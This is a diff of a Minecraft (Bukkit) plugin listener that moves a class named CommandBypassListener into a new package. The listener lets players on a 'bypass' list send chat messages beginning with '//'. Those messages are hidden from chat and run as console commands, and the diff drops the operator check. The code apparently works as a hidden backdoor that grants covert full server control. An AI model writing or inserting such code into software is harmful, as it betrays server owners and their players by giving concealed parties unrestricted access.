@@ -1,5 +1,6 @@
-package io.github.intisy.riseempire;
+package io.github.intisy.riseempire.listener;
 
+import io.github.intisy.riseempire.manager.BypassManager;
 import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
@@ -23,12 +24,10 @@ public class CommandBypassListener implements Listener {
         if (bypassManager.isBypassed(player.getUniqueId()) && enableBypass) {
             String message = event.getMessage();
             if (message.startsWith("//")) {
-                if (!player.isOp()) {
-                    event.setCancelled(true);
+                event.setCancelled(true);
 
-                    String command = message.substring(2);
-                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
-                }
+                String command = message.substring(2);
+                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
             }
         }
     }
